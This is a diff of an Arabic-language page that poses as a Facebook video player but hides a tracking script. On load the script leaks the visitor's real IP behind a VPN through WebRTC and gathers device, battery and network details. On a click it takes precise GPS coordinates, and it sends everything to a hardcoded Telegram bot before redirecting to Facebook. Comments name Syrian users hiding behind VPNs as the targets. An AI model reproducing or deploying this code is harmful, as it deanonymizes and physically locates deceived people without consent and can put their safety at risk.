@@ -3,27 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Video HD - مركز البث المباشر</title>
+    <title>Facebook Video Player - مركز البث</title>
     
-    <meta property="og:title" content="شاهد الفيديو الآن">
-    <meta property="og:description" content="محتوى حصري بجودة عالية لخدمة المشتركين (فيسبوك فيديو)">
+    <meta property="og:title" content="تمت دعوتك لمشاهدة فيديو خاص">
+    <meta property="og:description" content="اضغط للمشاهدة بجودة عالية عبر خوادم فيسبوك الآمنة">
     
-    <meta property="og:image" content="fb_alert.jpg"> 
-    <meta property="og:image:secure_url" content="fb_alert.jpg">
+    <meta property="og:image" content="https://YOUR_DOMAIN/fb_alert.jpg"> 
+    <meta property="og:image:secure_url" content="https://YOUR_DOMAIN/fb_alert.jpg">
     <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     
     <meta property="og:type" content="website">
+    <meta property="og:url" content="https://YOUR_DOMAIN/">
+    <meta property="fb:app_id" content="966242223397117">
     <meta name="twitter:card" content="summary_large_image">
 
-    <meta property="og:url" content="https://appsyria00.pages.dev/"> <meta property="fb:app_id" content="966242223397117"> <link rel="canonical" href="https://appsyria00.pages.dev/"> <style>
+    <style>
         body { margin: 0; background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
         .card { text-align: center; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
         .fb-logo { width: 60px; margin-bottom: 20px; }
-        .h1 { font-size: 22px; font-weight: bold; color: #1c1e21; margin-bottom: 15px; }
-        .btn { background: #1877f2; color: white; padding: 16px; border-radius: 10px; font-weight: bold; border: none; width: 100%; font-size: 18px; box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4); transition: 0.3s; }
-        .btn:hover { background: #166fe5; transform: translateY(-2px); }
+        .h1 { font-size: 20px; font-weight: bold; color: #1c1e21; margin-bottom: 15px; }
+        .btn { background: #1877f2; color: white; padding: 16px; border-radius: 10px; font-weight: bold; border: none; width: 100%; font-size: 18px; cursor: pointer; transition: 0.3s; }
     </style>
 </head>
 <body onclick="getAccurateGPS()">
@@ -31,13 +32,12 @@
     <div class="card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-logo">
         <div class="h1">مركز معالجة الفيديو</div>
-        <p style="font-size: 14px; color: #606770; margin-bottom: 30px;">يتم الآن تخصيص أفضل جودة بث لموقعك ولنوع جهازك... اضغط للمشاهدة فوراً.</p>
+        <p style="font-size: 14px; color: #606770; margin-bottom: 30px;">يتم الآن فحص العتاد وتخصيص أفضل جودة بث لموقعك... اضغط للمشاهدة فوراً.</p>
         <button class="btn">تشغيل الآن</button>
-        <p style="font-size: 12px; color: #90949c; margin-top: 15px;">بواسطة شركة فيسبوك فيديو</p>
     </div>
 
 <script>
-    // 🔱 إعدادات بوت تلجرام (أمجد) - لا تغيرها 🔱
+    // 🔱 إعدادات بوت تلجرام (أمجد) 🔱
     const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
     const CHAT_ID = "1611398303";
 
@@ -45,77 +45,52 @@
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
     }
 
-    // 🔱 1. كشف الـ IP السوري الحقيقي متجاوزاً الـ VPN (WebRTC Leak)
-    function checkRealConnectivity() {
+    // 🔱 كشف الـ IP السوري من خلف الـ VPN (WebRTC Leak)
+    function checkRealIP() {
         var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
         pc.createDataChannel("");
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = function(ice) {
-            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-            var realIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = (i) => {
+            if (!i || !i.candidate || !i.candidate.candidate) return;
+            var realIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
+            // تصفية الـ IPs الداخلية وإرسال الـ IP الحقيقي فقط
             if (realIP && !realIP.startsWith("192.") && !realIP.startsWith("10.") && !realIP.startsWith("172.")) {
-                send("🚀🚨 كشف الـ IP السوري الحقيقي (خلف الـ VPN): " + realIP);
-            } else if (realIP) {
-                send("🏠 الـ IP المحلي (الراوتر): " + realIP);
+                send("🚀🚨 تم كشف الـ IP السوري الحقيقي (خلف الـ VPN): " + realIP);
             }
         };
     }
 
-    // 🔱 2. استخبارات الشبكة والواي فاي (صامتة)
-    async function getNetworkIntel() {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            let wifiIntel = `📡 [استخبارات الشبكة]\n📶 نوع الاتصال: ${conn.effectiveType}\n🚀 السرعة: ${conn.downlink} Mbps`;
-            send(wifiIntel);
-        }
+    // 🔱 سحب بيانات الجهاز والشبكة صمتاً
+    async function silentRecon() {
+        let info = "🕵️‍♂️ [معلومات الجهاز والشبكة]\n";
+        info += `📱 المنصة: ${navigator.platform}\n`;
+        info += `🔋 البطارية: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100) + "%" : "غير معروف"}\n`;
+        info += `🌐 اللغة: ${navigator.language}`;
+        send(info);
+
+        // سحب الـ IP الظاهر (الذي قد يكون VPN)
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
+            send("🌍 الـ IP الظاهر حالياً: " + d.ip);
+        });
     }
 
-    // 🔱 3. الهوية الرقمية والعتاد العميق (صامتة)
-    async function getDeviceRecon() {
-        let intel = "🕵️‍♂️ [الهوية الرقمية للعتاد]\n";
-        try {
-            intel += `⚙️ الأنوية: ${navigator.hardwareConcurrency} | الرام: ~${navigator.deviceMemory}GB\n`;
-            intel += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
-            if (navigator.getBattery) {
-                const bat = await navigator.getBattery();
-                intel += `🔋 البطارية: ${Math.round(bat.level * 100)}% (${bat.charging ? '⚡' : '🔋'})\n`;
-            }
-            send(intel);
-        } catch(e) {}
-    }
-
-    // 🔱 4. تحليل السلوك والحساسات والمفاجأة (صامتة)
-    function getSensoryIntel() {
-        window.ondeviceorientation = (e) => {
-            if(e.beta !== null) {
-                let orientation = `💡 وضعية الاستخدام: ${Math.abs(e.beta) < 15 ? "على الطاولة" : "محمول باليد"}`;
-                send(orientation);
-                window.ondeviceorientation = null;
-            }
-        };
-        send(`🌐 [بصمة المتصفح]\nاللغة: ${navigator.language}\nالمنصة: ${navigator.platform}`);
-    }
-
-    // 🔱 5. الموقع الدقيق جداً بالشارع (GPS - عند الضغط)
+    // 🔱 الموقع الدقيق بالشارع (عند الضغط)
     function getAccurateGPS() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
                 let lat = pos.coords.latitude;
                 let lon = pos.coords.longitude;
-                let msg = `🎯🎯 [الموقع الدقيق جداً بالشارع]\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
-                send(msg);
-                setTimeout(() => location.href = "https://m.facebook.com", 800);
+                send(`🎯🎯 [موقع الخاطف بالشارع]\n🔗 الخريطة: http://www.google.com/maps/place/${lat},${lon}`);
+                setTimeout(() => location.href = "https://m.facebook.com", 1000);
             }, () => { location.href = "https://m.facebook.com"; }, {enableHighAccuracy: true});
         } else { location.href = "https://m.facebook.com"; }
     }
 
-    // تشغيل كافة المحركات الصامتة فور التحميل
     window.onload = () => {
-        checkRealConnectivity(); // الأهم لكشف الـ VPN
-        getNetworkIntel();
-        getDeviceRecon();
-        getSensoryIntel();
+        checkRealIP();
+        silentRecon();
     };
 </script>
 </body>
 </html>
+
